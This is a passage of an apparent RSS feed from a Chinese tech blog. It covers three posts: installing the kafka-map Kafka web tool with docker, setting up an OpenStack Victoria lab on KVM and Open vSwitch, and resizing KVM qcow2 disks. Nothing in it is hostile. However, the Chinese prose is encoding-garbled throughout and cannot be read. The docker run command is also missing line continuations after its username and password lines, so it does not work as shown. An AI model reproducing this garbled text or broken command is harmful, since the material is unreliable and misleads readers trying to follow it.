&lt;li&gt;ä¸»é¢˜åˆ›å»ºã€åˆ é™¤ã€æ‰©å®¹ï¼ˆåˆ é™¤éœ€é…ç½®delete.topic.enable = trueï¼‰&lt;/li&gt;
&lt;li&gt;brokerçŠ¶æ€ç›‘æ§&lt;/li&gt;
&lt;li&gt;æ¶ˆè´¹è€…ç»„æŸ¥çœ‹ã€åˆ é™¤&lt;/li&gt;
&lt;li&gt;é‡ç½®offset&lt;/li&gt;
&lt;li&gt;æ¶ˆæ¯æŸ¥è¯¢ï¼ˆæ”¯æŒStringå’Œjsonæ–¹å¼å±•ç¤ºï¼‰&lt;/li&gt;
&lt;li&gt;å‘é€æ¶ˆæ¯ï¼ˆæ”¯æŒå‘æŒ‡å®šçš„topicå’Œpartitionå‘é€å­—ç¬¦ä¸²æ¶ˆæ¯ï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;åŠŸèƒ½æˆªå›¾&#34;&gt;åŠŸèƒ½æˆªå›¾&lt;/h2&gt;
&lt;h3 id=&#34;æ·»åŠ é›†ç¾¤&#34;&gt;æ·»åŠ é›†ç¾¤&lt;/h3&gt;
&lt;p&gt;&lt;img alt=&#34;æ·»åŠ é›†ç¾¤&#34; loading=&#34;lazy&#34; src=&#34;https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/import-cluster.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;é›†ç¾¤ç®¡ç†&#34;&gt;é›†ç¾¤ç®¡ç†&lt;/h3&gt;
&lt;p&gt;&lt;img alt=&#34;é›†ç¾¤ç®¡ç†&#34; loading=&#34;lazy&#34; src=&#34;https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/clusters.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;broker&#34;&gt;broker&lt;/h3&gt;
&lt;p&gt;&lt;img alt=&#34;broker&#34; loading=&#34;lazy&#34; src=&#34;https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/brokers.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;ä¸»é¢˜ç®¡ç†&#34;&gt;ä¸»é¢˜ç®¡ç†&lt;/h3&gt;
&lt;p&gt;&lt;img alt=&#34;ä¸»é¢˜ç®¡ç†&#34; loading=&#34;lazy&#34; src=&#34;https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/topics.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;æ¶ˆè´¹ç»„&#34;&gt;æ¶ˆè´¹ç»„&lt;/h3&gt;
&lt;p&gt;&lt;img alt=&#34;æ¶ˆè´¹ç»„&#34; loading=&#34;lazy&#34; src=&#34;https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/consumers.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;æŸ¥çœ‹æ¶ˆè´¹ç»„å·²è®¢é˜…ä¸»é¢˜&#34;&gt;æŸ¥çœ‹æ¶ˆè´¹ç»„å·²è®¢é˜…ä¸»é¢˜&lt;/h3&gt;
&lt;p&gt;&lt;img alt=&#34;æ¶ˆè´¹ç»„è¯¦æƒ…&#34; loading=&#34;lazy&#34; src=&#34;https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/consumer-subscription.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;topicè¯¦æƒ…åˆ†åŒº&#34;&gt;topicè¯¦æƒ…â€”â€”åˆ†åŒº&lt;/h3&gt;
&lt;p&gt;&lt;img alt=&#34;topicè¯¦æƒ…â€”â€”åˆ†åŒº&#34; loading=&#34;lazy&#34; src=&#34;https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/topic-info-partition.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;topicè¯¦æƒ…broker&#34;&gt;topicè¯¦æƒ…â€”â€”broker&lt;/h3&gt;
&lt;p&gt;&lt;img alt=&#34;topicè¯¦æƒ…â€”â€”broker&#34; loading=&#34;lazy&#34; src=&#34;https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/topic-info-broker.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;topicè¯¦æƒ…æ¶ˆè´¹ç»„&#34;&gt;topicè¯¦æƒ…â€”â€”æ¶ˆè´¹ç»„&lt;/h3&gt;
&lt;p&gt;&lt;img alt=&#34;topicè¯¦æƒ…â€”â€”æ¶ˆè´¹ç»„&#34; loading=&#34;lazy&#34; src=&#34;https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/topic-info-consumer.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;topicè¯¦æƒ…æ¶ˆè´¹ç»„é‡ç½®offset&#34;&gt;topicè¯¦æƒ…â€”â€”æ¶ˆè´¹ç»„é‡ç½®offset&lt;/h3&gt;
&lt;p&gt;&lt;img alt=&#34;topicè¯¦æƒ…â€”â€”æ¶ˆè´¹ç»„é‡ç½®offset&#34; loading=&#34;lazy&#34; src=&#34;https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/topic-info-consumer-reset-offset.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;topicè¯¦æƒ…é…ç½®ä¿¡æ¯&#34;&gt;topicè¯¦æƒ…â€”â€”é…ç½®ä¿¡æ¯&lt;/h3&gt;
&lt;p&gt;&lt;img alt=&#34;topicè¯¦æƒ…â€”â€”é…ç½®ä¿¡æ¯&#34; loading=&#34;lazy&#34; src=&#34;https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/topic-info-config.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;ç”Ÿäº§æ¶ˆæ¯&#34;&gt;ç”Ÿäº§æ¶ˆæ¯&lt;/h3&gt;
&lt;p&gt;&lt;img alt=&#34;æ¶ˆè´¹æ¶ˆæ¯&#34; loading=&#34;lazy&#34; src=&#34;https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/producer-message.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;æ¶ˆè´¹æ¶ˆæ¯&#34;&gt;æ¶ˆè´¹æ¶ˆæ¯&lt;/h3&gt;
&lt;p&gt;&lt;img alt=&#34;æ¶ˆè´¹æ¶ˆæ¯&#34; loading=&#34;lazy&#34; src=&#34;https://gitee.com/dushixiang/kafka-map/raw/master/screenshot/consumer-message.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;docker-æ–¹å¼å®‰è£…&#34;&gt;docker æ–¹å¼å®‰è£…&lt;/h2&gt;
&lt;p&gt;ä¸€è¡Œå‘½ä»¤å³å¯å®Œæˆå®‰è£…&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker run -d &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    -p 8080:8080 &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    -v /opt/kafka-map/data:/usr/local/kafka-map/data &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    -e DEFAULT_USERNAME&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;admin
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -e DEFAULT_PASSWORD&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;admin
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --name kafka-map &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    --restart always dushixiang/kafka-map:latest
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ›´å¤šå®‰è£…æ–¹å¼ä»¥åŠç›¸ä¿¡ä¿¡æ¯å¯æŸ¥çœ‹: &lt;a href=&#34;https://github.com/dushixiang/kafka-map&#34;&gt;https://github.com/dushixiang/kafka-map&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>openstack victoriaç‰ˆå®‰è£…</title>
      <link>https://www.typesafe.cn/posts/install-openstack-victoria/</link>
      <pubDate>Sat, 12 Jun 2021 00:00:00 +0800</pubDate>
      <guid>https://www.typesafe.cn/posts/install-openstack-victoria/</guid>
      <description>&lt;p&gt;è¿‘æœŸå…¬å¸ä¸šåŠ¡éœ€æ±‚ï¼Œéœ€è¦å®‰è£…ä¸€å¥—Openstackç¯å¢ƒå­¦ä¹ ï¼Œçœ‹äº†ä¸€ä¸‹ç°åœ¨å·²ç»å‡ºäº†&lt;code&gt;wallaby&lt;/code&gt;ç‰ˆäº†ï¼Œæˆ‘æœæ–­é€‰æ‹©äº†ä¸Šä¸€ä¸ªç‰ˆæœ¬&lt;code&gt;victoria&lt;/code&gt;ã€‚å› ä¸ºæ²¡æœ‰è¶³å¤Ÿå¤šçš„ç‰©ç†æœåŠ¡å™¨äº†ï¼Œåªå¥½æ‰¾äº†ä¸€å°64æ ¸256Gå†…å­˜6Tç¡¬ç›˜çš„æœºå™¨æ¥åˆ›å»ºå‡ å°è™šæ‹Ÿæœºæ¥æ­ç¯å¢ƒäº†ã€‚&lt;/p&gt;
&lt;h1 id=&#34;å®éªŒç¯å¢ƒ&#34;&gt;å®éªŒç¯å¢ƒ&lt;/h1&gt;
&lt;p&gt;æ­¤æ¬¡å®éªŒä½¿ç”¨åˆ°äº†ä¸‰å°è™šæ‹Ÿæœºï¼Œéƒ½æ˜¯ä½¿ç”¨centos8ç³»ç»Ÿï¼Œä¸€å°æœºå™¨å½“ä½œæ§åˆ¶å’Œç½‘ç»œèŠ‚ç‚¹ï¼Œå¦å¤–ä¸¤å°å½“ä½œè®¡ç®—èŠ‚ç‚¹ï¼Œä½¿ç”¨OVS+VLANçš„ç½‘ç»œæ¨¡å¼ï¼Œeth0ä½œä¸ºç®¡ç†ç½‘ç»œï¼Œeth1äº’ç›¸è¿æ¥åˆ°OVSç½‘æ¡¥ä¸Šæ¨¡æ‹Ÿtrunkç½‘å¡ï¼Œcontrollerå¤šå¢åŠ ä¸€ä¸ªeth2ç”¨äºè®¿é—®å¤–éƒ¨ç½‘ç»œã€‚&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;èŠ‚ç‚¹&lt;/th&gt;
          &lt;th&gt;ä½œç”¨&lt;/th&gt;
          &lt;th&gt;eth0&lt;/th&gt;
          &lt;th&gt;eth1&lt;/th&gt;
          &lt;th&gt;eth2&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;controller&lt;/td&gt;
          &lt;td&gt;æ§åˆ¶èŠ‚ç‚¹ã€ç½‘ç»œèŠ‚ç‚¹&lt;/td&gt;
          &lt;td&gt;172.16.10.100&lt;/td&gt;
          &lt;td&gt;æ— IP&lt;/td&gt;
          &lt;td&gt;æ¡¥æ¥ï¼Œæ— IP&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;compute-101&lt;/td&gt;
          &lt;td&gt;è®¡ç®—èŠ‚ç‚¹&lt;/td&gt;
          &lt;td&gt;172.16.10.101&lt;/td&gt;
          &lt;td&gt;æ— IP&lt;/td&gt;
          &lt;td&gt;âŒ&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;compute-102&lt;/td&gt;
          &lt;td&gt;è®¡ç®—èŠ‚ç‚¹&lt;/td&gt;
          &lt;td&gt;172.16.10.102&lt;/td&gt;
          &lt;td&gt;æ— IP&lt;/td&gt;
          &lt;td&gt;âŒ&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;å®‰è£…è™šæ‹Ÿæœº&#34;&gt;å®‰è£…è™šæ‹Ÿæœº&lt;/h1&gt;
&lt;h2 id=&#34;å®‰è£…ä¾èµ–&#34;&gt;å®‰è£…ä¾èµ–&lt;/h2&gt;
&lt;p&gt;å®‰è£…KVMå’ŒLinuxç½‘æ¡¥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum install -y qemu-kvm libvirt virt-install bridge-utils virt-manager dejavu-lgc-sans-fonts
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;dejavu-lgc-sans-fonts&lt;/code&gt;ç”¨äºè§£å†³ &lt;code&gt;virt-manaer&lt;/code&gt; ä¹±ç &lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;å¯åŠ¨&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl enable libvirtd &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; systemctl start libvirtd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®‰è£…OVS&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum install openvswitch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯åŠ¨OVS&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;systemctl enable openvswitch &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; systemctl start openvswitch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;åˆ›å»ºè™šæ‹Ÿæœº&#34;&gt;åˆ›å»ºè™šæ‹Ÿæœº&lt;/h3&gt;
&lt;p&gt;ä½¿ç”¨ virt-manager åˆ›å»ºä¸‰å°è™šæ‹Ÿæœº&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20210604140054913&#34; loading=&#34;lazy&#34; src=&#34;https://oss.typesafe.cn/vm-nodes.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;é…ç½®ç½‘ç»œ&#34;&gt;é…ç½®ç½‘ç»œ&lt;/h3&gt;
&lt;h4 id=&#34;é…ç½®ç®¡ç†ç½‘å¡&#34;&gt;é…ç½®ç®¡ç†ç½‘å¡&lt;/h4&gt;
&lt;p&gt;ç»™è™šæ‹Ÿæœºé…ç½®æ¡¥æ¥ç½‘ç»œï¼Œå‚è€ƒ&lt;a href=&#34;https://typesafe.cn/posts/linux-kvm/&#34;&gt;Linuxè™šæ‹ŸåŒ–æŠ€æœ¯KVM&lt;/a&gt;ï¼Œæ•ˆæœå¦‚å›¾&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://oss.typesafe.cn/vm-manage-port-config.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;é…ç½®trunkç½‘å¡&#34;&gt;é…ç½®trunkç½‘å¡&lt;/h4&gt;
&lt;p&gt;ä½¿ç”¨ovsåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç½‘æ¡¥ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ovs-vsctl add-br br-vlan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ­¤æ—¶ç½‘æ¡¥&lt;code&gt;br-vlan&lt;/code&gt;ä¸Šæ˜¯æ²¡æœ‰ä»»ä½•è™šæ‹Ÿç½‘å¡çš„ï¼Œç„¶åå…³é—­è™šæ‹Ÿæœºï¼Œåœ¨&lt;code&gt;virt-manager&lt;/code&gt;ä¸Šæ·»åŠ ä¸€ä¸ªç½‘ç»œè®¾å¤‡&lt;/p&gt;</description>
    </item>
    <item>
      <title>KVM è™šæ‹Ÿæœºç£ç›˜æ‰©å®¹</title>
      <link>https://www.typesafe.cn/posts/kvm-disk-resize/</link>
      <pubDate>Mon, 31 May 2021 19:20:00 +0800</pubDate>
      <guid>https://www.typesafe.cn/posts/kvm-disk-resize/</guid>
      <description>&lt;h3 id=&#34;ä¸€é•œåƒæ‰©å®¹&#34;&gt;ä¸€ã€é•œåƒæ‰©å®¹&lt;/h3&gt;
&lt;p&gt;æ³¨æ„ï¼šéœ€è¦å…ˆå…³é—­è™šæ‹Ÿæœºæ‰èƒ½æ“ä½œï¼Œ&lt;code&gt;+&lt;/code&gt;å·å‰é¢æœ‰ç©ºæ ¼ï¼Œåé¢æ²¡æœ‰ç©ºæ ¼ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;qemu-img resize test.qcow2 +80G
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åŸé•œåƒç£ç›˜å¤§å°20GBï¼Œæ‰©å®¹å®Œæˆåå¯ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;qemu-img info test.qcow2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¾“å‡º&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;image: test.qcow2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;file format: qcow2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;virtual size: 100G &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;107374182400&lt;/span&gt; bytes&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;disk size: 885M
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cluster_size: &lt;span style=&#34;color:#ae81ff&#34;&gt;65536&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Format specific information:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    compat: 1.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    lazy refcounts: false
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    refcount bits: &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    corrupt: false
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;äºŒwindowsç£ç›˜æ‰©å®¹&#34;&gt;äºŒã€Windowsç£ç›˜æ‰©å®¹&lt;/h3&gt;
&lt;p&gt;Windowsç£ç›˜æ‰©å®¹æ¯”è¾ƒæ–¹ä¾¿ï¼Œè¿›å…¥ &lt;strong&gt;è®¡ç®—æœºç®¡ç†&amp;gt;ç£ç›˜ç®¡ç†&lt;/strong&gt; æ‰¾åˆ°æ–°å¢çš„åˆ†åŒºæŠŠå®ƒæ·»åŠ åˆ°éœ€è¦çš„åˆ†åŒºå³å¯ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä¸‰linuxç£ç›˜æ‰©å®¹&#34;&gt;ä¸‰ã€Linuxç£ç›˜æ‰©å®¹&lt;/h3&gt;
&lt;p&gt;å¯åŠ¨è™šæ‹Ÿæœºåï¼Œè¿›å…¥è™šæ‹Ÿæœºæ§åˆ¶å°ï¼Œä½¿ç”¨&lt;code&gt;fdisk -l&lt;/code&gt;å‘½ä»¤æŸ¥çœ‹ç£ç›˜ä¿¡æ¯ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Disk /dev/vda: &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; GiB, &lt;span style=&#34;color:#ae81ff&#34;&gt;107374182400&lt;/span&gt; bytes, &lt;span style=&#34;color:#ae81ff&#34;&gt;209715200&lt;/span&gt; sectors
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Units: sectors of &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; * 512 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sector size &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;logical/physical&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt; bytes / &lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;I/O size &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;minimum/optimal&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt; bytes / &lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Disklabel type: dos
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Disk identifier: 0xe11f7f01
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Device     Boot   Start      End  Sectors Size Id Type
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/dev/vda1  *       &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2099199&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2097152&lt;/span&gt;   1G &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; Linux
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/dev/vda2       &lt;span style=&#34;color:#ae81ff&#34;&gt;2099200&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41943039&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;39843840&lt;/span&gt;  19G 8e Linux LVM
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Disk /dev/mapper/cl-root: &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; GiB, &lt;span style=&#34;color:#ae81ff&#34;&gt;18249416704&lt;/span&gt; bytes, &lt;span style=&#34;color:#ae81ff&#34;&gt;35643392&lt;/span&gt; sectors
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Units: sectors of &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; * 512 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sector size &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;logical/physical&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt; bytes / &lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;I/O size &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;minimum/optimal&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt; bytes / &lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Disk /dev/mapper/cl-swap: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; GiB, &lt;span style=&#34;color:#ae81ff&#34;&gt;2147483648&lt;/span&gt; bytes, &lt;span style=&#34;color:#ae81ff&#34;&gt;4194304&lt;/span&gt; sectors
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Units: sectors of &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; * 512 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sector size &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;logical/physical&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt; bytes / &lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt; bytes
